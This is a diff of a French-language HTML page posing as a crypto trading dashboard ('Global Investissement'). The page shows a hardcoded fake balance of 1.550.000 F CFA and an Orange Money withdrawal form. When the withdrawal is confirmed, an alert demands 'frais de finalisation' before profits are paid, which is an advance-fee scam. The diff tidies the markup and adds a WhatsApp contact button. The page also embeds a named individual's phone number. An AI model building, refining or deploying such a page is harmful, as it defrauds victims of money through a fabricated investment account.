@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Interface de Trading Crypto - Global Investissement</title>
+    <link rel="stylesheet" href="styles.css"> <!-- External CSS for better organization -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -69,6 +69,7 @@
             color: #21262d;
             font-weight: bold;
             border-radius: 5px;
+            margin-right: 10px;
         }
 
         main {
@@ -233,7 +234,6 @@
     </style>
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 </head>
-
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
@@ -253,27 +253,25 @@
             <div class="actions">
                 <span class="balance">Solde: 1.550.000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">ROMBA R YACINE IIEME JUMELLE </span><br> 
+                    <span id="user-name">ROMBA R YACINE IIEME JUMELLE</span><br>
                     <span id="user-phone">226 54 29 87 24</span>
                 </div>
-                 <div class="logo">
-                <button>Déconnexion</button> 
-            <a href="https://wa.me/221761222369" class="button-link">WhatsApp </a>
-        </div>
+                <button id="whatsapp-button">Contact WhatsApp</button>
+                <button id="logout-button">Déconnexion</button>
             </div>
         </nav>
     </header>
     <main>
         <div class="trading-interface">
-            <div class="price-info">
+            <section class="price-info">
                 <h2>BTC/USDT</h2>
                 <div class="price">67,969.20</div>
                 <div class="variation">+0.17%</div>
-            </div>
-            <div id="chart_container">
+            </section>
+            <section id="chart_container">
                 <div id="tradingview_chart"></div>
-            </div>
-            <div class="order-book">
+            </section>
+            <section class="order-book">
                 <h3>Order Book</h3>
                 <div class="orders">
                     <div class="order">
@@ -282,21 +280,22 @@
                         <span class="total">13,395.70515 USDT</span>
                     </div>
                 </div>
-            </div>
-            <div class="withdrawal-options">
+            </section>
+            <section class="withdrawal-options">
                 <button id="orange-money">Retrait via Orange Money</button>
-            </div>
-            <div class="withdrawal-form" id="withdrawal-form">
+            </section>
+            <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
                 <div class="info" id="withdrawal-info"></div>
                 <button id="confirm-withdrawal">Valider le Retrait</button>
-            </div>
-            <div class="error-message" id="error-message"></div>
+            </section>
+            <section class="error-message" id="error-message"></section>
         </div>
     </main>
     <footer>
         <p>© 2024 Africa Investissement. Tous droits réservés.</p>
     </footer>
+    <script src="script.js"></script> <!-- External JS for better organization -->
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const priceElement = document.querySelector('.price-info .price');
@@ -316,7 +315,7 @@
 
             const setWithdrawalInfo = () => {
                 const paymentMethod = "Orange Money";
-                const accountName = "ROMBA R YACINE IIEME JUMELLE";  
+                const accountName = "ROMBA R YACINE IIEME JUMELLE";
                 const accountNumber = "226 54 29 87 24";
                 withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 1.550.000 F CFA`;
                 withdrawalForm.style.display = 'flex';
@@ -327,6 +326,10 @@
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
                 alert('Veuillez payer les frais de finalisation pour recevoir vos benefices dans les 5 minutes');
                 withdrawalForm.style.display = 'none';
+            });
+
+            document.getElementById('whatsapp-button').addEventListener('click', () => {
+                window.location.href = "https://wa.me/22654298724";
             });
 
             // Ensure the TradingView chart is displayed
@@ -347,5 +350,4 @@
         });
     </script>
 </body>
-
 </html>
